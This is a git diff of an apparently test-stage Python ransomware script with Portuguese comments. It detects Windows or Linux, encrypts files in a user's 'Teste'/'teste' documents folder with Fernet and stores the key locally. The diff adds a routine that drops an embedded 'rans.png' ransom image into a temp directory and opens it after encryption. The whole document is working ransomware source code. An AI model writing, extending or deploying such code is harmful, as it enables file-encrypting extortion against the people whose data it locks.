@@ -1,6 +1,35 @@
 from cryptography.fernet import Fernet
 import os
 import platform
+import subprocess
+import pkgutil
+import importlib.resources as resources
+
+
+diretorio = os.path.dirname(os.path.abspath(__file__))
+
+png = "rans.png"
+arquivo_png = os.path.join(diretorio, png)
+
+def abrir_imagem():
+    try:
+        # Acesse a imagem incorporada como um objeto binário
+        imagem_data = pkgutil.get_data("pacote", "rans.png")
+        
+        if os.name == 'nt':
+            # Windows
+            temp_image_path = os.path.join(os.environ["TEMP"], "rans.png")
+            with open(temp_image_path, 'wb') as arq_temp:
+                arq_temp.write(imagem_data)
+            subprocess.run(['explorer.exe', temp_image_path], check=True)
+        elif os.name == 'posix':
+            # Linux
+            temp_image_path = '/tmp/rans.png'
+            with open(temp_image_path, 'wb') as arq_temp:
+                arq_temp.write(imagem_data)
+            subprocess.run(['xdg-open', temp_image_path], check=True)
+    except Exception as erro:
+        print(f"Erro ao abrir a imagem: {erro}")
 
 def user_name():
     if os.name == 'posix':
@@ -38,7 +67,6 @@ def decrypt_file(encrypted_path, key, output_path):
 
     with open(output_path, 'wb') as decrypted_file:
         decrypted_file.write(decrypted_data)
-
 
 def criptografar(diretorio_path):
     key_path = 'key.key'
@@ -78,12 +106,14 @@ def identificar_so():
         nome = user_name()
         diretorio = f'C:\\Users\\{nome}\\Documents\\Teste'
         criptografar(diretorio)
+        abrir_imagem()
     elif 'Linux' in sistema:
         distro = platform.freedesktop_os_release()
         print(distro['NAME'], distro['VERSION'])
         nome = user_name()
         diretorio = f'/home/{nome}/Documentos/teste'
         criptografar(diretorio)
+        abrir_imagem()
     else:
         print(f'Sistema Operacional não reconhecido: {sistema}')
     
